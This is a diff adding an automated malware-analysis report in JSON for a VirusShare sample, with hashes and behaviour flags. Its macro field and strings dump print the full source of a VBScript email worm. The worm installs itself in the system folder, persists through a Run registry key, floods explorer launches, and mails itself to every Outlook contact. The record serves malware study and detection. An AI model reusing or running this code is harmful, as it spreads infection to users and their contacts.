@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Copyfile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "shell": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "On Error Resume Next\nDim Outlook, MAPI, ListaEndereco, NumeroEnderco, Mensagem\nSet Outlook = CreateObject( \"Outlook.Application\" )\nSet MAPI = Outlook.GetNameSpace( \"MAPI\" )\nSet FNC_ARQ = createobject(\"scripting.filesystemobject\")\nSet FNC_SHELL = createobject(\"wscript.shell\")\nFNC_ARQ.Copyfile wscript.scriptfullname, FNC_ARQ.getspecialfolder(1) & \"\\Grasiele.VBS\"\nFNC_SHELL.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DarkDevil.Grasiele.BR\", FNC_ARQ.getspecialfolder(1) & \"\\Grasiele.VBS\"\nfor X=1 to 100\nFNC_SHELL.run(FNC_ARQ.getspecialfolder(0) & \"\\explorer.exe\")\nnext\nMSGBOX \"Eu Amo a Grasiele!\", 64 ,\"DarkDevil\"\nFor Each ListaEndereco In MAPI.AddressLists\nFor NumeroEnderco = 1 To ListaEndereco.AddressEntries.Count\nSet Mensagem = Outlook.CreateItem( 0 )\nMensagem.BCC = ListaEndereco.AddressEntries( NumeroEnderco ).Address\nMensagem.Subject = \"Ola Lembra de mim!\"\nMensagem.Body = \"Estou com saudades.\"\n Mensagem.Attachments.Add WScript.ScriptFullName\n Mensagem.DeleteAfterSubmit = True\nMensagem.Send\nNext\nNext"
+    },
+    "filename": "VirusShare_39c1dbe38926b8682c79db4d08a68560",
+    "filesize": 1051,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "39c1dbe38926b8682c79db4d08a68560",
+        "sha1": "7ec13fa8a23add61072a34d13027a4a08008874d",
+        "sha256": "0fa014092fa57a3391368953a887fea93ac45c1aac57cce815d6b0bf471f9542"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Dim Outlook, MAPI, ListaEndereco, NumeroEnderco, Mensagem",
+            "Set Outlook = CreateObject( \"Outlook.Application\" )",
+            "Set MAPI = Outlook.GetNameSpace( \"MAPI\" )",
+            "Set FNC_ARQ = createobject(\"scripting.filesystemobject\")",
+            "Set FNC_SHELL = createobject(\"wscript.shell\")",
+            "FNC_ARQ.Copyfile wscript.scriptfullname, FNC_ARQ.getspecialfolder(1) & \"\\Grasiele.VBS\"",
+            "FNC_SHELL.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DarkDevil.Grasiele.BR\", FNC_ARQ.getspecialfolder(1) & \"\\Grasiele.VBS\"",
+            "for X=1 to 100",
+            "FNC_SHELL.run(FNC_ARQ.getspecialfolder(0) & \"\\explorer.exe\")",
+            "next",
+            "MSGBOX \"Eu Amo a Grasiele!\", 64 ,\"DarkDevil\"",
+            "For Each ListaEndereco In MAPI.AddressLists",
+            "For NumeroEnderco = 1 To ListaEndereco.AddressEntries.Count",
+            "Set Mensagem = Outlook.CreateItem( 0 )",
+            "Mensagem.BCC = ListaEndereco.AddressEntries( NumeroEnderco ).Address",
+            "Mensagem.Subject = \"Ola Lembra de mim!\"",
+            "Mensagem.Body = \"Estou com saudades.\"",
+            " Mensagem.Attachments.Add WScript.ScriptFullName",
+            " Mensagem.DeleteAfterSubmit = True",
+            "Mensagem.Send",
+            "Next",
+            "Next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.283224",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
